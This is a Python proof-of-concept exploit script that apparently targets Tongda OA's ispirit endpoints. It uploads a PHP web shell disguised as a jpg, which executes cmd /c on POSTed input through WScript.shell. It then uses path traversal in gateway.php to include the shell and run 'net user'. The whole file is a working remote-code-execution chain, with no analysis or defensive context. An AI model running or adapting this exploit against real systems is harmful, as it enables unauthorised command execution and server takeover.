# -*- coding:utf-8 -*-
__author__ = 'leezp'
__date__ = 20200318
import requests

upload_url = "http://192.168.1.109:8085/ispirit/im/upload.php"
include_url = "http://192.168.1.109:8085/ispirit/interface/gateway.php"

shell_name = 'shell.php'
shell_dir = "/"
path = shell_dir + shell_name
header = {
    "Content-Type": "multipart/form-data; boundary=abcd",
}
check_flag = "23333:)"
shell_content = '''<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
'''
data1 = "--abcd\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n--abcd\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n--abcd\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n--abcd\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n" + shell_content + " " + check_flag + "\"\r\n--abcd--"
req1 = requests.post("http://192.168.1.109:8085" + "/ispirit/im/upload.php", headers=header, verify=False, data=data1,
                     timeout=10)
print(req1.text)
path = req1.text
path = path[path.find('@') + 1:path.rfind('|')].replace("_", "/").replace("|", ".")
print(path)
include_data = 'json={"url":"/general/../../attach/im/' + path + '"}&cmd=net user'  # string 不会进行urlencode，与burp格式一致

# include_data = {"json": "{\"url\":\"/general/../../attach/im/" + path + "\"}"+"&cmd=net user"}  # json 格式python自动urlencode

header = {
    "Content-Type": "application/x-www-form-urlencoded"
}
include_res = requests.post(include_url, headers=header, data=include_data)
print(include_res.text)
if '23333:)' in include_res.text:
    print('success')
